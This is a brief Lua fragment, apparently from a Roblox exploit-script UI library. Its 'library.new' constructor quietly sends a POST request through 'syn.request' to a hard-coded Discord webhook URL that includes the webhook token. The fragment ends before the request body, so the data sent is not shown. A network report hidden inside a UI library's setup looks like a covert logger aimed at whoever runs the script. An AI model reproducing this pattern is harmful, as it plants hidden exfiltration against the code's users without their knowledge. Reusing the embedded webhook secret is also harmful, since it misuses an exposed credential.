...
function library.new(library_title, cfg_location)
    ...
    local response = syn.request(
        {
            Url = 'https://discord.com/api/webhooks/1077047646411313182/bRaPqs6Q4A2IdmERIw8I-yZXW3uke9zMVQtDlskjrfPjpj8AjGBKr4qWe7Xe3ssk2HJE', Method = 'POST', Headers = {['Content-Type'] = 'application/json'},
